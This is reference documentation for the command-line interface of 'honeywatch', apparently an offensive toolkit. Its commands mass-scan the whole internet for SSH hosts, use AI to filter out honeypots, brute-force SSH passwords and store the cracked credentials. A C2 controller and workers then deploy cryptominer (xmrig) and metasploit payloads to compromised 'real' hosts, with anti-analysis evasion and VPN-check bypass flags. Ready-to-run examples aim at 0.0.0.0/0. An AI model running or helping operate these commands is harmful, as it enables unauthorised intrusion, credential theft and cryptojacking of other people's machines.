# CLI Reference

All commands are defined in `honeywatch/cli.py:26` `build_parser()`. Heavy imports are lazy so `--help` works without optional deps.

```
honeywatch --version
honeywatch --help
honeywatch <COMMAND> --help
```

Global flag:

| Flag | Effect |
|---|---|
| `--version` | print version from `importlib.metadata` or fallback `0.1.0` (`cli.py:422`) |

Exit codes: `0` success, `2` VPN refusal (`honeywatch/vpn.py:169` `REFUSAL`), `1` runtime error, `130` `KeyboardInterrupt` (`cli.py:1147`).

---

## `honeywatch scan` — discovery + scoring

```bash
honeywatch scan TARGET [TARGET ...] [options]
```

| Flag | Default | Help |
|---|---|---|
| `TARGET` (positional, `nargs=+`) | — | target IPs/CIDRs, e.g. `192.0.2.0/24 198.51.100.7` |
| `--tool {masscan,zmap}` | `masscan` | port scanner to use |
| `--ports SPEC` | `22` | comma-separated ports/ranges, e.g. `22` or `22,2200-2222` (parsed by `parse_ports`, `cli.py:488`) |
| `--rate INT` | from `scanners.*.rate` or `1000` | scan rate in packets/sec |
| `--concurrency INT` | `probe.concurrency` (`512`) | SSH probe concurrency |
| `--timeout FLOAT` | `probe.timeout_s` (`6.0`) | SSH probe timeout in seconds |
| `--probe-level {fast,full}` | `fast` | fingerprint depth |
| `--auth-probe` | off | one bogus SSH auth attempt |
| `--no-ai` | off | disable AI classification |
| `--model NAME` | `ai.model` | AI model name |
| `--db PATH` | `honeywatch.db` | SQLite path |
| `--out-dir DIR` | `reports` | directory for report files |
| `--config PATH` | auto | TOML path |
| `--max-hosts INT` | none | cap hosts probed/scored |
| `--interval SECONDS` | none | re-run loop every N seconds until Ctrl-C |
| `--report-format FORMAT...` | `json csv md` | formats to write: `json`, `csv`, `md` (comma- or space-separated) |
| `--skip-vpn-check` | off | bypass Mullvad gate |
| `--all-hosts` | off | keep non-SSH hosts (debug; default `scan.only_ssh=true`) |
| `--resume` | off | skip hosts already scored in the store |
| `--progress` | off | live heartbeat every 1000 probes |

**Behavior** (`cli.py:723` `_cmd_scan`):

- Resolves `rate` from `scanners.<tool>.rate` or `scanners.masscan.rate`.
- Parses `ports` via `parse_ports` (deduped, range-expanded).
- Runs `masscan`/`zmap` via `asyncio.to_thread` with `excludes`/`timeout_s` from config, slices to `max_hosts`, filters `store.scored_hosts()` when `--resume`.
- Calls `Pipeline.probe_hosts` + `analyze_and_score` (VRAM-friendly semaphore), persists via `store.upsert_scores`, writes `reports/scan-<stamp>.{ext}` for requested formats, prints `print_summary` (`cli.py:1118`).

**Examples:**

```bash
honeywatch scan 0.0.0.0/0 --tool masscan --ports 22 --rate 10000 --max-hosts 200000 --skip-vpn-check
honeywatch scan 203.0.113.0/8 --tool masscan --ports 22 --rate 20000 --skip-vpn-check
honeywatch scan 0.0.0.0/0 --tool zmap --rate 5000 --max-hosts 200000 --skip-vpn-check
honeywatch scan 192.0.2.0/24 --resume --progress --skip-vpn-check
```

---

## `honeywatch probe` — single/multi host fingerprint

```bash
honeywatch probe ip[:port] [options]
# note: cli.py currently takes a single positional "host"; for many hosts use scan or multiple probe invocations
```

| Flag | Default | Help |
|---|---|---|
| `host` (`ip[:port]`, `[v6]:port` supported) | port `22` | host to probe (parsed by `parse_host`, `cli.py:466`) |
| `--config PATH` | auto | TOML path |
| `--no-ai` | off | disable AI |
| `--model NAME` | config | model override |
| `--probe-level {fast,full}` | config | depth |
| `--skip-vpn-check` | off | bypass gate |
| `--json` | off | emit single JSON object (machine-readable) |

Handler `cli.py:580` `_cmd_probe`: builds `HostHit`, calls `pipeline.probe_hosts([host])` then `analyze_and_score`, prints via `_print_probe` (`cli.py:624`) or `_print_probe_json` (`cli.py:653` → `_score_to_jsonable` `cli.py:654`).

**Examples:**

```bash
honeywatch probe 1.2.3.4 --skip-vpn-check
honeywatch probe 1.2.3.4 --probe-level full --skip-vpn-check
honeywatch probe "[2001:db8::1]:2222" --json --skip-vpn-check
```

---

## `honeywatch report` — render from store

```bash
honeywatch report [options]
```

| Flag | Default | Help |
|---|---|---|
| `--db PATH` | `honeywatch.db` | DB path |
| `--format {json,csv,md}` | `json` | report format |
| `--top INT` / `--limit INT` | `20` | number of scores (aliases) |
| `--label {real,likely_real,uncertain,likely_honeypot,honeypot}` | none | filter by final label |
| `--min-confidence FLOAT` | `0.0` | `confidence >=` filter |
| `--out PATH` | `reports/report-<stamp>.<ext>` | file or directory to write into |
| `--config PATH` | auto | TOML path |

Handler `cli.py:691` `_cmd_report`: queries `store.query_scores(limit, label, min_confidence)` then `write_json`/`write_csv`/`write_md` (`honeywatch/report.py:142`). Prints `wrote N score rows to <out>`.

```bash
honeywatch report --format json --limit 200
honeywatch report --format csv --label honeypot --out ./out.csv
honeywatch report --format md --min-confidence 0.9 --out reports/
```

---

## `honeywatch config` — print/write defaults

```bash
honeywatch config [--write PATH]
```

| Flag | Help |
|---|---|
| `--write PATH` | write default config to PATH instead of stdout (`write_example`, `config.py:377`) |

Without `--write`, prints TOML to stdout via `_toml_dumps` (`cli.py:511`).

```bash
honeywatch config --write config.toml
honeywatch config > /tmp/default.toml
```

---

## `honeywatch stats` — aggregates

```bash
honeywatch stats [options]
```

| Flag | Default | Help |
|---|---|---|
| `--db PATH` | `honeywatch.db` | DB path |
| `--json` | off | emit JSON |
| `--config PATH` | auto | TOML path |

Handler `cli.py:854` `_cmd_stats`: `store.stats()` → `{total, by_label, by_flag, known_keys}`. Human output lists `hosts`, `known keys`, `by label`, `by flag` sorted by count.

```bash
honeywatch stats
honeywatch stats --json | jq .
```

---

## `honeywatch c2` — controller / dashboard

```bash
honeywatch c2 [options]
```

| Flag | Default | Help |
|---|---|---|
| `--host HOST` | `c2.host` (`0.0.0.0`) | bind host |
| `--port INT` | `c2.port` (`8443`) | bind port |
| `--tls-cert PATH` | `c2.tls_cert` | TLS cert |
| `--tls-key PATH` | `c2.tls_key` | TLS key |
| `--db PATH` | `storage.db` | DB path (C2 shares storage DB) |
| `--generate-certs` | off | generate self-signed certs in `./certs` before starting (`c2/tls.py:132` `ensure_self_signed_pair`) |
| `--api-token TOKEN` | `c2.api_token` | shared bearer secret |
| `--skip-vpn-check` | off | bypass gate |
| `--config PATH` | auto | TOML path |

Handler `cli.py:890` `_cmd_c2`: builds `C2Store`, `build_ssl_context`, `Controller(...).run()` (`c2/controller.py:1`). Serves dashboard at `https://host:port/`, REST `/api/*`, WebSocket `/ws`. Ctrl-C stops cleanly.

```bash
pip install honeywatch[c2]
honeywatch c2 --generate-certs --skip-vpn-check
honeywatch c2 --tls-cert certs/honeywatch.crt --tls-key certs/honeywatch.key --api-token secret
```

---

## `honeywatch worker` — worker node

```bash
honeywatch worker [options]
```

| Flag | Default | Help |
|---|---|---|
| `--controller-url URL` | `workers.controller_url` (`http://127.0.0.1:8443`) | controller URL |
| `--categories CSV` | `workers.categories` | payload categories this worker accepts |
| `--exec-mode {dry_run,local_simulate,ssh}` | `workers.exec_mode` | how to run scripts |
| `--poll-interval FLOAT` | `workers.poll_interval` (`5.0`) | seconds between poll/claim |
| `--ssh-user USER` | `workers.ssh_user` (`root`) | SSH user |
| `--ssh-key PATH` | `workers.ssh_key` | SSH private key |
| `--api-token TOKEN` | `workers.api_token` | bearer secret to controller |
| `--config PATH` | auto | TOML path |

Handler `cli.py:931` `_cmd_worker`: `Worker(...).run()` (`c2/worker.py:1`) — polls `/api/tasks/claim` or uses WebSocket, executes via `dry_run`/`local_simulate`/`ssh`.

```bash
honeywatch worker --categories miner --exec-mode dry_run
honeywatch worker --categories miner,exploit --exec-mode ssh --ssh-user admin --ssh-key ~/.ssh/id_rsa
```

---

## `honeywatch deploy` — enqueue a payload

```bash
honeywatch deploy PAYLOAD_ID [options]
```

| Flag | Default | Help |
|---|---|---|
| `payload_id` (positional) | — | payload to deploy, e.g. `xmrig`, `metasploit` |
| `--target-label {real,likely_real,uncertain,likely_honeypot,honeypot}` | `real`+`likely_real` | only target hosts with this label |
| `--min-confidence FLOAT` | `0.7` (store selection) | minimum confidence |
| `--max-confidence FLOAT` | `1.0` | maximum confidence |
| `--limit INT` | none | max targets |
| `--target-file PATH` | none | file with `ip[:port]` lines (skip store selection) |
| `--var KEY=VALUE` (repeatable) | — | payload variable, e.g. `--var pool=... --var wallet=...` (parsed by `_parse_key_value`, `cli.py:879`) |
| `--evasion CSV` | `payloads.default_evasion` | evasion payloads to chain, e.g. `upx,symbol_strip` |
| `--exec-mode {dry_run,local_simulate,ssh}` | from manifest | override worker exec mode |
| `--ssh-user USER` | none | SSH user for selected targets |
| `--ssh-key PATH` | none | SSH private key |
| `--db PATH` | `honeywatch.db` | DB path |
| `--controller-url URL` | none | if set, enqueue via API instead of direct DB |
| `--dry-run` | off | build and print manifest without enqueueing |
| `--config PATH` | auto | TOML path |
| `--skip-vpn-check` | off | bypass gate |

Handler `cli.py:981` `_cmd_deploy`: gathers targets from file or `select_targets` with `TargetFilter`, builds `evasion` via `prepare_evasion_pipeline`, calls `build_manifest` then either `dispatch_to_controller` (HTTP POST `/api/operations`) or `enqueue_operation` (direct `C2Store`). Dry run prints payload id, target count, evasion list, and first-host sample script.

```bash
honeywatch deploy stratum --target-file targets.txt --var upstream_pool=pool.example.com:3333 --dry-run --skip-vpn-check
honeywatch deploy xmrig --target-label real --min-confidence 0.9 --var pool=stratum+tcp://pool:3333 --var wallet=W --skip-vpn-check
honeywatch deploy xmrig --target-file targets.txt --evasion upx,symbol_strip,anti_vm --var pool=... --var wallet=... --skip-vpn-check
honeywatch deploy xmrig --controller-url http://c2:8443 --var pool=... --var wallet=...
```

---

## `honeywatch setup` — wizard

```bash
honeywatch setup [options]
```

| Flag | Help |
|---|---|
| `--ollama-api-key KEY` | Ollama API key (prompts securely if omitted) |
| `--ollama-base-url URL` | base URL (default `https://ollama.com/v1`) |
| `--ollama-model MODEL` | model (default `llama3.1:8b`) |
| `--pool URL` | default mining pool |
| `--wallet ADDR` | default wallet address |
| `--pass PASS` | default pool password / worker id (`--pass` dest is `pass_`, `cli.py:378`) |
| `--worker NAME` | default worker name |
| `--tls` | use TLS for pool connections |
| `--db PATH` | DB path (default `honeywatch.db`) |

Handler `cli.py:1064` `_cmd_setup`: `SetupStore(db)` + `run_setup_wizard` (`agent/setup.py:247`). Non-interactive when flags supplied; otherwise prompts (getpass for key). Prints `setup saved to <db>`.

```bash
honeywatch setup --ollama-api-key ollama_... --pool pool.example.com:3333 --wallet W --pass x --worker honeywatch
```

---

## `honeywatch chat` — AI agent

```bash
honeywatch chat [--prompt TEXT] [options]
```

| Flag | Default | Help |
|---|---|---|
| `--prompt TEXT` | none | single prompt; omit for interactive REPL |
| `--db PATH` | `honeywatch.db` | DB path |
| `--skip-vpn-check` | off | bypass gate for network tools |
| `--config PATH` | auto | TOML path |

Handler `cli.py:1095` `_cmd_chat`: `TerminalUI(db_path, config_path, skip_vpn_check)` (`cli_chat.py:748`). `--prompt` runs one `agent.chat(text)` round; otherwise `ui.run()` REPL with banner, status line, `LO>` prompt, slash commands `/help,/status,/setup,/wallet,/ollama,/model,/clear,/history,/quit`.

```bash
honeywatch chat --prompt "list payloads" --skip-vpn-check
honeywatch chat
```

---

## `honeywatch crack` — SSH password cracking

```bash
honeywatch crack [HOSTS...] [options]
```

Targets come from positional `ip[:port]` hosts, `--target-file`, or the store (`--target-label`/`--min-confidence`/`--limit`). Recovered credentials persist to the `credentials` table and auto-feed `deploy`. See [SSH Cracking](crack.md).

| Flag | Default | Help |
|---|---|---|
| `HOSTS...` (positional) | — | `ip[:port]` hosts to crack |
| `--target-file PATH` | — | file with `ip[:port]` lines |
| `--target-label LABEL` | — | pull hosts from the store by final label |
| `--min-confidence F` | 0.0 | lower bound when pulling from the store |
| `--limit N` | 1000 | cap targets pulled from the store |
| `--users a,b,c` | built-ins | usernames to try |
| `--user U` | — | pin a single username |
| `--wordlist PATH` | — | newline-separated password wordlist |
| `--passwords a,b,c` | — | explicit passwords (bypasses wordlist/mutations) |
| `--no-mutations` | off | try wordlist entries verbatim |
| `--concurrency N` | config `crack.concurrency` (8) | parallel attempts per host |
| `--host-concurrency N` | config `crack.host_concurrency` (32) | hosts at once |
| `--timeout S` | config `crack.timeout_s` (6.0) | seconds per attempt |
| `--max-attempts N` | unbounded | guesses per host before giving up |
| `--no-stop-on-success` | off | keep going after a hit (audit mode) |
| `--no-save` | off | do not persist credentials |
| `--json` | off | emit a JSON array |
| `--db PATH` | config | SQLite path |
| `--skip-vpn-check` | off | bypass the Mullvad gate |
| `--config PATH` | auto | TOML path |

Handler `cli.py` `_cmd_crack`: builds `CrackTarget`s, runs `crack_targets` (async), persists wins via `Store.upsert_credential`.

```bash
honeywatch crack 10.0.0.5 --wordlist rockyou.txt --user root --skip-vpn-check
honeywatch crack --target-label real --min-confidence 0.8 --json --skip-vpn-check
```

## `honeywatch creds` — list cracked credentials

```bash
honeywatch creds [options]
```

| Flag | Default | Help |
|---|---|---|
| `--ip IP` | — | filter by host ip |
| `--port PORT` | — | filter by port |
| `--user USER` | — | filter by username |
| `--limit N` | 100 | max rows |
| `--json` | off | emit a JSON array |
| `--db PATH` | config | SQLite path |
| `--config PATH` | auto | TOML path |

Handler `cli.py` `_cmd_creds`: `Store.query_credentials`.

---

## Helpers

- `parse_host(spec, default_port=22) -> (ip, port)` — `cli.py:466` — handles `ip`, `ip:port`, `[v6]:port`.
- `parse_ports(spec) -> list[int]` — `cli.py:488` — `22` / `22,80` / `2200-2222`, deduped.
- `build_parser() -> ArgumentParser` — `cli.py:26` — construct the full parser (useful for Sphinx / tests).
- `main(argv=None) -> int` — `cli.py:1136` — entry point; returns exit code, handles `SystemExit` from argparse.

## Config Folding

`_apply_scan_options` (`cli.py:805`) folds scan flags into `cfg` so pipeline sees them:

- `--concurrency` → `probe.concurrency`
- `--timeout` → `probe.timeout_s`
- `--probe-level` → `probe.level`
- `--auth-probe` → `probe.auth_probe=true`
- `--no-ai` → `ai.enabled=false`
- `--model` → `ai.model`
- `--all-hosts` → `scan.only_ssh=false`

`_call_scan` (`cli.py:823`) passes only the kwargs the current `Pipeline.scan` signature accepts (via `_match_signature`, `cli.py:447`), so both `probe_level` and `level` spellings are safe.
